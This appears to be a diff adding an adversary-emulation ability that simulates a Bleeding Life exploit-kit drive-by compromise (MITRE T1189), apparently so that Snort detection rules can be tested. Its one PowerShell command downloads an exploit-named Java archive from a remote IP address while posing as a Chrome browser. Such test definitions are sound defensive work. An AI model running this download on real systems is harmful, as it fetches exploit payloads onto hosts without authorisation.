@@ -1,0 +1,38 @@
+- tactic: initial-access
+  technique_name: 'Drive-By Compromise: Exploit Kit Bleeding Life'
+  technique_id: T1189
+  name: 'Intrusion: Bleeding Life exploit kit module call'
+  description: Exploit kits are pre-packaged sets of code and malware geared toward
+    finding and taking advantage of common browser vulnerabilities. They are JavaScript
+    code that provides an entry point to a system to initiate the next state. Snort's
+    rules look for known exploit kit nomenclature, information sent back exposing
+    sensitive infrastructure, attempts to reach a certain file, etc. Rules try to
+    identify the exact kit being used based on actor-group patterns, such as favored
+    target website, malware types, and code similarities.
+  executors:
+  - name: psh
+    platform: windows
+    command: 'Invoke-WebRequest -Uri "http://198.18.133.49/Java-2010-3552.jar" ` -Method
+      Get ` -Headers @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+      AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" } '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 15
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: ef53f9c5-528f-4e57-abf8-293d6b852f40
